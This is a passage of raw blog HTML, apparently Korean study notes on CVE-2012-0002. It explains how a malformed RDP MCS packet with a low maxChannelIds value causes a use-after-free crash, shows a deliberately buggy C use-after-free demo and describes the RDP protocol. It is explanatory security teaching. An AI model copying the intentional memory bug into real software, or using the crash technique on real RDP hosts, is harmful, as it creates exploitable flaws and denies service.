operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></code></pre></div>\n<h2 id=\"cve-2012-0002-취약점-원리\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9B%90%EB%A6%AC\" aria-label=\"cve 2012 0002 취약점 원리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 취약점 원리</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADn0lEQVQ4y2WSbUxTZxTHT6sMO5UFBSMdSjvpy1paB3W0XIrVipS2YGnvfW5b7nBURQR0y0Jx8jIiyZB1Gs0ynU1mMrcZJx/2kmVvZsmW+GHZJiNzM2ZfWCZuc31B2gAWVnrPcssgS3aSk+fJk/x/Oef/f4AnBP5tEc9xgACwdl2RCJZqo9a6MxFw1fHm7RQWyfVDGsMuYH0HVyMixKcfwv/qP8AsFB0O0dmeQfEroTC8GBwuVxmMf7/b2JB5Vm9ES6P/U0EjwGLhN0XodouzgyzrWXYFuIonZLNwxyoTpL8dg0RyXhaJz0yev/AWSuX6tMvTkh4bv4Nz8/iCAEQRANL0sl6cPRlmBSjjCbnKs2wdT9PBTHOz5X5y/vbM3CJ+8vnXyLW0Y9/AKbwfTWI8kcLYH7EjaKr08RzXyROSv2KZ2w2AHg/wQhNyFFl2AFm2BGuqH40n5y9Fp2an41OzkblUJpaYWYhG4jOR2IO53+LRhBUBJDzHWXlCRnhCCoXpshMKIUy1d25aZL0/z3p9CiRM1iOhJv+alv6AmIeIaxExL5ZIFT9IpNbFIomsTvAsQ8jriwzzBvp98OFe+2poD12EA4InapliGGCNtsxE6cpMRq3WVA0Aa7DBeWSkrIIGkKi+4xH+vBeF6OUrq9BhF2PbIcDW1sfxuWPy4YKipZStXEcPO3y+v7b/dB/VtL8xPyd/fZmeKoZthsKenbvhOk1GuXoXUrsbJt4OncnJpuzzAh4ILH8U4W0jAAjETdBx7ToO3Yng4PhdDIRHR7sTS+su+v1y0DGgdzDBWieNdjt9q8/XkttFc7BAyJZo68HNoXNX4Jn+14ZOvH/jYe8X43fbwh9NQiB8LVZDtyY9J0aQvfRBCFVPlKd9/pMLDPkeWdJmcni6bY4mrKl13Zxi2Uok5DhPyFdpv//cex9/A23vfHk5/EsMP7v1K/be/B1BvkXtVKoqMgrFU2NbC0ukig1SwI7DMEETKdi8UOegB5wNDNrqPbfr61yPTBAvpBhScK95f95AMATOwy/tY7pfvUEfPfkjffzsBXhSV6VXa429aq2xS7PdnKfRU3DRWi/GYACaLHawWOx91dRepMy2n7Lp682AXhawq3PZQwkAbJVAjgEApLBNrgOVegcoVQYoLigBnbICjDoTULqq9eW6qgJZabmmVL3DXaqs2KVUPy1TaSpLXjbvEeOxLthn90LlHk+u/VBQwjw/mGu0sY/9A4hEr7W7ho5OAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image22\"\n        title=\"image22\"\n        src=\"/static/be29eddf484fb717699e8161603d7ad1/32056/image22.png\"\n        srcset=\"/static/be29eddf484fb717699e8161603d7ad1/e9ff0/image22.png 180w,\n/static/be29eddf484fb717699e8161603d7ad1/f21e7/image22.png 360w,\n/static/be29eddf484fb717699e8161603d7ad1/32056/image22.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>RDP가 사용되는 동작 방식은 네트워크 관리자가 다른 컴퓨터를 통해 원격으로\n접속하는 동안에 해당 RDP 서비스를 인터넷을 통해 공유되고 있는 상태에서\n발생된다. RDP는 메모리에 있는 패킷을 처리할 수 없기 때문에 이를 통해\n공격자는 초기화에 실패했거나 현재 실행중인 개체에 대해 T.125\nConnectMCSPDU 패킷의 maxChannelids 필드 값을 5이하로 설정하여\nUse-After-Free 취약점이 발생시킬 수 있는 변조된 RDP MCS 패킷 바이트를\n페이로드로 작성하여 전송을 하여 공격 대상의 단말기에 BSOD 장애를\n발생시켜 가용성을 무너트릴 수 있는 방식이다.</p>\n<p>’</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">※ BlueScreen Of <span class=\"token function\">Death</span> <span class=\"token punctuation\">(</span>BSOD<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> 마이크로소프트 윈도우 운영체제에서 시스템\n오류를 복구하지 못할 때 나타나는 화면</code></pre></div>\n<h2 id=\"공격-기법-및-기본-개념\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B0%8F-%EA%B8%B0%EB%B3%B8-%EA%B0%9C%EB%85%90\" aria-label=\"공격 기법 및 기본 개념 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 기법 및 기본 개념</h2>\n<h3 id=\"uaf-use-after-free\" style=\"position:relative;\"><a href=\"#uaf-use-after-free\" aria-label=\"uaf use after free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>UAF (Use-After-Free)</h3>\n<p>C, C++ 언어를 활용하여 개발을 진행할 때 수동으로 동적 메모리를 할당을\n하여 관리를 한다. 메모리를 기준에 맞게 관리를 하지 못하여 해제된\n메모리에 접근을 시도하거나 메모리를 할당한 후 해제를 하지 않아 메모리\n누수가 발생되어 큰 문제를 야기시킨다. 동적 메모리를 올바르게 관리하지\n않아 발생하는 취약점 중 하나이다.</p>\n<p>Use-After-Free 취약점은 해제된 메모리에 접근을 하여 값을 쓸 수 있는\n취약점이다. UAF 취약점이 존재하는 소스 코드를 통해 과정을 살펴보겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\\#include \\<span class=\"token operator\">&lt;</span>stdio<span class=\"token punctuation\">.</span>h\\<span class=\"token operator\">></span>\n\n\\#include \\<span class=\"token operator\">&lt;</span>stdlib<span class=\"token punctuation\">.</span>h\\<span class=\"token operator\">></span>\n\n\\#include \\<span class=\"token operator\">&lt;</span>string<span class=\"token punctuation\">.</span>h\\<span class=\"token operator\">></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">char</span> \\<span class=\"token operator\">*</span>bufA <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span>\\<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*1. bufA 변수에 문자열 복사*/</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">,</span> <span class=\"token string\">\"boan Project\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> bufA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*bufA 메모리 해제*/</span>\n\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>bufB <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*2. bufB 변수에 문자열 복사*/</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>bufB<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Exploit Zer0Luck\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> bufB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/*2. bufA 변수에 문자열 복사 (UAF)*/</span>\n\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>bufA<span class=\"token punctuation\">,</span> <span class=\"token string\">\"boan Project\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> bufB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>bufA 변수의 메모리를 총 150바이트 크기만큼 할당한 후 strcpy 함수를 통해\n“boan Project” 문자열을 복사한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABlElEQVQY02NQcbUQdJuTVOq8MKHSaV58hdPihAqn2fEVDoviK2wmRrS5TU7odpgc3WI3Nbrdrjeyw2F2bIPTgoRyp4XxlY5z4yqc5sZXeC9Lr3Cuj6pSktMvZFDytjAOPVryP/RK+f+gCyX/g66V/Q85Wfrf50rhf49zuf/Db1b997tQ9N//Wsn/oJPF//2vl/wPvVj+P+hy6X+/c4X/fc7m/4++Vfs/aEnOfzUl4/8MVlVBvLZLYiPN6gMdLTtD3C27Q93MW4LcrLrD3Cxbgt3NuoPdzVuC3S27Qt3Nm4PcrbpC3SzaQ9wsO0PdLNpC3Czagt3MeoPdTIt93U31HBwYgv836IX9b7W1mR/NYD0jksF2bjSD9bQIBrv5MQw206MYrBZEQcTnxTBYT4tksJsXw2AzKwqszmZmFBhbLYxisGgKZjDVdWBgCPxVpx/4vdbE712lIAMDA4PzjlRmu4WxzA6rEpjtF8UxO65JZLZfHAfmg8QdVyUyOyyLZ3ZYkcBsvyQOjB3WJTLbdkYwG2nZMgEARD2dwbxMpnMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image23\"\n        title=\"image23\"\n        src=\"/static/7e931fd96dc6fa8297279d0b112b1289/0a47e/image23.png\"\n        srcset=\"/static/7e931fd96dc6fa8297279d0b112b1289/e9ff0/image23.png 180w,\n/static/7e931fd96dc6fa8297279d0b112b1289/f21e7/image23.png 360w,\n/static/7e931fd96dc6fa8297279d0b112b1289/0a47e/image23.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>bufA 메모리를 해제한 후 새로운 150바이트 크기의 메모리를 bufB에\n할당한다. strcpy 함수를 통해 “Exploit Zer0Luck” 문자열을 복사한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABTElEQVQY06WQzStEUQDFzyxYKBYsEJKSDLJQ4j+gNPPeve8+Y4adf8PGgoUlO4WkLFnYkWc+3vX17h01C7OzlCIiksKREMrOqdOp0zmbH5jJDAIAyd9enIt99FfgzFTsvftz98OoaQGmu/tqOT8L8hzcWwevS+Dywvu3EvWdPWjsbkdDvBfVrW1AXR1XF8DLEni8Be6sgadZ8PEMvCijojkOGD91kndkIatS2jhSh9LXeaG0Tbj72460wdBIdJAUJpB+lHW9IytUGEhfh46no6TQgVD6JD2ul8Soburoy8FIv5xzvWjPH7MmKWxBKJsTytqEY/OOjMLhEVN0PVNQKRMKZaz0bSCUDV3PRgnXBq6yxdG0XXFUsbVr4Bi4n6wlNz84PJVAvoB8BW8PQT6B5Q2QNz9YPXzmLXgXgXz+ZljVCExwuh+7El/Q/6s3cl3ftnkn3r4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image24\"\n        title=\"image24\"\n        src=\"/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/32056/image24.png\"\n        srcset=\"/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/e9ff0/image24.png 180w,\n/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/f21e7/image24.png 360w,\n/static/7c4b3479d5ba0c59c9fc6e7ac2ebd169/32056/image24.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>bufA의 메모리 상태를 보면 주소의 값은 바뀌지 않았다. 메모리 bufA, bufB가\n같은 주소를 가리키고 있다는 점을 알 수 있다. 이미 해제되었던 메모리 bufA\n가 메모리 할당자로 들어가고 새로운 메모리 영역을 할당할 때 메모리를\n효율적으로 관리하기 위해 기존에 해제하였던 메모리가 그대로 대입되어\n발생하는 현상이다.</p>\n<p>이미 해제되었던 메모리 bufA에 접근을 하면 bufB가 같이 영향을 받기 때문에\n개발자가 의도하지 않은 정상적인 범위를 벗어나게 되어 문제가 생긴다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7EAAAOxAGVKw4bAAACGklEQVQozyWK3U9ScQCG3/ljbV10UVktNFypa3WhskkBCvFlcU5wDnAO31ORck3gcABFZ5YtDpZ1k2ZZW10hbK1/xCFHSFl50bruH6i2rn4Nu3revc+DP7EI/3MqoqMQMVeKaqxv4mSsFNQAQDcu4AS6oEUfzuAsTuEkWDXbNf4iTCwbUWLdiBHrqxhxbE8RY4ojgzo9Ab0tGtZWIuj7EIV5MwzruzjMqwK06Dndg37defSeu6y5fq0XVy5qoevmfy3DvB6EZSsKy+sYbJtxON9P42aKw8AlPfBgJTw79Ez0j5XFoFERRHNZFM1rwcCNIn/fmOaKxpwvbZC8BUOOkww5b9r4JBAzPRcDplKnDYrjSki0vowKo0kmNKDTMxB3F2mwvUSFwyIVWkUa6PBLkboOUzRy9JAK7UXKHc3T0LdlyrfnqdAuHvf+gwXqay9Q38E8nfy+Sr1bs7S/Z4TC9Sm57qgknjprM4qzMqM4qgnFsZNQrDuTir2aKNsqU4qtOq04a0nFXulwRnHVkseNvZb47z4nS7dWwmvDV8eWEKClUf7HArhdGfxeHp59GR5VxoSaAtvMwt3IgGlmwbcKYBtZeJs5+FoFeBoy7jZluNUM+K8FMNv3MDRgAvx/H/P+34+0HymFp53XsA2JsHWJTNTnCKtmibueIW41QzyqfLw7n2dfJkxdIkxDIu69DPEe5smdtwkyPGgm/wAnY9ITzaeFbgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image25\"\n        title=\"image25\"\n        src=\"/static/a97169337b1417ed6d1bf5d77d59c810/0a47e/image25.png\"\n        srcset=\"/static/a97169337b1417ed6d1bf5d77d59c810/e9ff0/image25.png 180w,\n/static/a97169337b1417ed6d1bf5d77d59c810/f21e7/image25.png 360w,\n/static/a97169337b1417ed6d1bf5d77d59c810/0a47e/image25.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>해제된 포인터 bufA와 새로 할당된 bufB가 같은 메모리 영역을 가리키고 있기\n때문에 포인터 bufA에 “boan Project” 문자열을 복사한 후 포인터 bufB의\n내용을 출력하면 문자열이 바뀐 것을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAoUlEQVQI1x3CSw6CMBQAQO7gBfqD0g+igJigQssrSIFEWcnCndfw8EYmE4zj9FrX57KAc977YfCDH+dptq7bfb7s8Ybb1XV9VV2MMXXdlOWZRyLPy32aBca2LTjbQt2YLD8JoYVMpEq4kCgtiD4oqbVO41gqpaXSEReM8YhLFsYBQNcCWHD93R+zApMQ4RBhhijDlBLC8JZsMaGEMkpDTP5/0cgkaWepZfsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image26\"\n        title=\"image26\"\n        src=\"/static/385c0dee899a171d502c51fe88420cb6/d8f62/image26.png\"\n        srcset=\"/static/385c0dee899a171d502c51fe88420cb6/e9ff0/image26.png 180w,\n/static/385c0dee899a171d502c51fe88420cb6/f21e7/image26.png 360w,\n/static/385c0dee899a171d502c51fe88420cb6/d8f62/image26.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>메모리를 부여하는 동적 메모리 함수들은 환경에 따라 다르겠지만 효율성을\n위해 이미 해제하였던 메모리를 재사용한다. 이렇게 해제된 메모리 포인터에\n만약 데이터를 쓰게 된다면 다른 영역에서 사용하고 있던 메모리에 데이터가\n작성이 되어 큰 문제를 발생한다.</p>\n<p>프로그램을 개발하면서 대규모로 진행되어 구조가 복잡 해질수록 UAF\n취약점은 코드 영역에서 부분적으로 나타난다. 구성이 다른 컴포넌트들이\n결합된 형태의 프로그램에서 두 컴포넌트가 서로 연결성을 띄면서 동작하는\n경우 컴포넌트에서 객체나 메모리의 사용을 끝났다고 인지하여 해제를\n하였지만 다른 컴포넌트에서는 해제되었다는 사실을 알지 못한 채 해제된\n메모리를 그대로 사용할 수 있게 된다.</p>\n<p>힙 메모리를 사용하는 프로그램에서는 메모리를 할당하는 부분이 동작이 다\n다르기 때문에 UAF 취약점의 영향력은 판단하기가 어렵다. 현존하는\n프로그램에서 공격이 불가능하다고 알려진 버그가 UAF 취약성을 통해서\n실제로는 공격이 가능했던 취약점인 경우가 많이 발생한다.</p>\n<h3 id=\"rdp-remote-desktop-protocol\" style=\"position:relative;\"><a href=\"#rdp-remote-desktop-protocol\" aria-label=\"rdp remote desktop protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDP (Remote Desktop Protocol)</h3>\n<p><strong>1. RDP (Remote Desktop Protocol) 이해</strong></p>\n<p>RDP 프로토콜은 기본적으로 원격 컴퓨터 시스템과의 연결에 있어서 그래픽\n적인 기능을 만족하도록 설계가 되었으며 사용자의 컴퓨터와 원격 컴퓨터\n시스템과의 동작 사이에 확장적인 전송 메커니즘을 제공한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\n <span class=\"token number\">1.</span>  비디오 드라이버를 사용하여 렌더링 정보를 네트워크 패킷으로       \n     구성하고 네트워크를 통해 네트워크를 통해 클라이언트로 전송하여   \n     디스플레이 출력을 렌더링 한다<span class=\"token punctuation\">.</span>                                   \n                                                                      \n <span class=\"token number\">2.</span>  클라이언트에서 RDP 프로토콜은 렌더링 데이터를 받고 패킷을 해당   \n     그래픽 장치 인터페이스 <span class=\"token punctuation\">(</span>GDI<span class=\"token punctuation\">)</span> API 호출로 해석한다<span class=\"token punctuation\">.</span>                \n                                                                      \n <span class=\"token number\">3.</span>  입력 경로의 경우 클라이언트 마우스 및 키보드 이벤트가            \n     클라이언트에서 서버로 리다렉션된다<span class=\"token punctuation\">.</span>                              \n                                                                      \n <span class=\"token number\">4.</span>  서버에서 RDP 프로토콜은 자체 키보드 및 마우스 드라이버를         \n     사용하여 이벤트를 수신한다<span class=\"token punctuation\">.</span>                                      \n</code></pre></div>\n<p><strong>2. RDP 프로토콜 기능</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 88.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACwUlEQVQ4y12TX2+cOBTF+XSdmSRqlSbbavd1V6oq9WU/aaSEAAM2xhgbmzH/DBjMQGY1uI2q/T1avr73nHvsfPz057fv/959/Hp79+X27svu8Hl/87g7PHzY3+8Pn/eHh7//+fHp/q8Pu/ub28fd/npyc/vH7vBwuHl0lFJSSqWUMYZzHsdxkiS+77+8vEAYI4Rc10UIAQAIIVEEoijKsgwAkCTJtZgx1ratMUZrzRhN0xQhFIYhYwxjjDYIIXiDc57nuda6bdtr8dvbm9qQUvq+nySJt5EkSRAEEMLj8RhuQAgRQhDCLMsopU7f98uyjOM4z/O6rgihOI4hhFrraZqMMcuyzPNsjBnHcVmWaZqWZTmfz+u6OhhjSinnfF3X0+lkZ2OM0Q0hBGPM9uGcJ0mCEFJKaa2HYXCmabpcLtM0zfM8TRPZKIqCbVj9VrmUEiGU5zlCSAhRlqVTVdU4jlVVNU3Ttu3z87PneWEYep73+vrqum4URa7rBkHg+34QBJ7nAXD1vCiK/3fOsqwoirIszcb7+TAMWmu7kXEclVJd1zmccyllVVXLsrRtCwCw8qSUVnxVVVZ813VlWRZFIYTgnCulnLIsu65TStkOlFJCCKXU7kNKGYZhmqbGmK7r+r7vuq5pmmEYrsXvY9shIYQYY0IIQihNU+sfY4wQUtd13/dt20opf4bkd8OqqvI8L4oiG5LjLwAAT09PdqmUUps8zrkzDIOU0hhjQ5LnOcY4SRJKqdUvhLBC+IYQAmOcZdnpdHKaptFa2z1N08QYsz0JIZ7nBUEAAMAYCyHqum426rq2mbtm+3w+d11njCGEAAAQQsfjMYqieMP2hxD6vh/Hse/7jDEpZdM0jg0g59wmXAhhl2QNew8Z+UUURQAA+9BPt20kLpcLhDCOY0ppVVXv/+F8Ps8b9prWep7ncRz/A2eNtClCqacLAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 5 4 2\"\n        title=\"image 5 4 2\"\n        src=\"/static/d1f902f659ebffcc4633f758357c5ded/977f7/image-5.4.2.png\"\n        srcset=\"/static/d1f902f659ebffcc4633f758357c5ded/e9ff0/image-5.4.2.png 180w,\n/static/d1f902f659ebffcc4633f758357c5ded/f21e7/image-5.4.2.png 360w,\n/static/d1f902f659ebffcc4633f758357c5ded/977f7/image-5.4.2.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. RDP 기반의 애플리케이션 설계 구성</strong></p>\n<p>RDP 기반의 애플리케이션을 설계 구성요소로 터미널 서버, 전송 프로토콜,\n클라이언트 로 구성된다. 일반적으로 원격 데스크톱 연결의 제어 터미널로\n불리며 서버는 제어가 되는 터미널이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: 